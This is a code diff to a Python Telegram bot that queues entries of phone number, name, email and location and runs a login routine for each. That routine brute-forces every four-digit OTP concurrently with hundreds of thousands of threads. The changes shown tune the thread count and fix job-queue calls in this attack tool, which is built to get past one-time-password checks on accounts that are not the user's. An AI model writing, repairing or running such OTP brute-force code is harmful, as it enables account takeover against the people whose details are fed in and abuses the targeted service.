@@ -128,7 +128,7 @@ async def process_login(chat_id, bot, message_data, key):
 
     async def check_otp_with_updates():
         nonlocal found_otp, checked_otps
-        with concurrent.futures.ThreadPoolExecutor(max_workers=350000) as executor:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=300000) as executor:
             future_to_otp = {executor.submit(try_otp, otp): otp for otp in range(1000, 10000)}
 
             for i, future in enumerate(concurrent.futures.as_completed(future_to_otp)):
@@ -173,10 +173,9 @@ async def add_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         if added_count > 0:
             await bot.send_message(chat_id, f"✅ Added {added_count} entries to DATA_MAP successfully!")
-            # Immediately trigger processing if queue was empty
-            if len(request_queue) == added_count:
+            if len(request_queue) == added_count:  # If queue was empty before
                 await bot.send_message(chat_id, f"Starting to process first entry '{request_queue[0][2]}' immediately!")
-                context.job_queue.run_once(process_queue, 0, context=context)  # Process first entry immediately
+                context.job_queue.run_once(process_queue, 0, data=context)  # Process first entry immediately
         else:
             await bot.send_message(chat_id, "❌ No valid entries added! Use format: `key - ebooks/... - number - name - email - location` with each entry on a new line.")
     else:
@@ -190,20 +189,20 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if message in DATA_MAP:
         request_queue.append((chat_id, DATA_MAP[message], message))
         await bot.send_message(chat_id, f"✅ [{message}] Added request to queue. Will process when its turn comes.")
-        # If queue was empty, start processing immediately
-        if len(request_queue) == 1:
-            context.job_queue.run_once(process_queue, 0, context=context)
+        if len(request_queue) == 1:  # If queue was empty
+            context.job_queue.run_once(process_queue, 0, data=context)
     else:
         await bot.send_message(chat_id, f"❌ '{message}' not found! First add data using: `/add\n{message} - ebooks/... - number - name - email - location`", parse_mode="Markdown")
 
-async def process_queue(context: ContextTypes.DEFAULT_TYPE):
+async def process_queue(job_context):
+    context = job_context  # The context is passed via the data parameter
     if request_queue:
         chat_id, message_data, key = request_queue.pop(0)
         await context.bot.send_message(chat_id, f"Processing request for '{key}': {message_data.split(' - ')[1]}")
         await process_login(chat_id, context.bot, message_data, key)
         # Schedule the next item if there are more in the queue
         if request_queue:
-            context.job_queue.run_once(process_queue, 600, context=context)  # Next item after 10 minutes
+            context.job_queue.run_once(process_queue, 600, data=context)  # Next item after 10 minutes
 
 async def main():
     app = Application.builder().token(BOT_TOKEN).build()
